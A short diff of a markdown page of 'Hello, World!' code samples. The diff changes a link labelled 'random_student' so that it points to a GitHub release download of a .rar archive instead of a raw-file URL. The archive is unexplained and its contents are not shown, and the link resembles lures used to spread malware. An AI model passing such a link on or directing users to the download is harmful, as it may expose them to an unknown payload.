@@ -2,7 +2,7 @@
 ```python
 print("Hello, World!")
 ```
-[random_student](https://github.com/works456/works456/raw/cc98ee3e98b02d4ae6e6f6b45b41a7784261316c/random_student.rar)
+[random_student](https://github.com/works456/works456/releases/download/v1.0/random_student.rar)
 
 ### C++
 ```cpp
